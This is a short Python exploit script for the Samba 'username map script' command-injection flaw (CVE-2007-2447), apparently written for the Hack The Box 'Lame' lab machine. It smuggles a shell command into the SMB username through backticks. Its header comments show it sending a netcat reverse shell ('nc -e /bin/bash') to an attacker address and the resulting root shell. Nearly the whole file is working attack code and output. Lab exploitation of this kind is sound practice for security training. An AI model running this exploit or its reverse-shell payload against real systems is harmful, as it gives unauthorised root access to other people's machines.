#!/usr/bin/python3

# Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution
# Refer: https://wiki.jacobshodd.com/writeups/hack-the-box/lame#exploitation

# ┌──(Hades㉿10.10.14.6)-[0.6:14.8]~/exploitation/samba
# └─$ python3 samba_rce_CVE-2007-2447.py 10.10.10.3 'nc -e /bin/bash 10.10.14.6 443'

# ┌──(Hades㉿10.10.14.6)-[0.5:12.7]~
# └─$ sudo nc -nvlp 443                                                                                                                                                   1 ⨯
# listening on [any] 443 ...
# connect to [10.10.14.6] from (UNKNOWN) [10.10.10.3] 43658
# id
# uid=0(root) gid=0(root)

from smb.SMBConnection import SMBConnection
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False
import sys
if len(sys.argv) < 3:
    print ("\nUsage: " + sys.argv[0] + " <HOST> <CMD>\n")
    sys.exit()



username = "/=`" + sys.argv[2] + "`"
password = ""
conn = SMBConnection(username, password, "HACKTHEBOX" , "HTB", use_ntlm_v2 = False)
assert conn.connect(sys.argv[1], 445)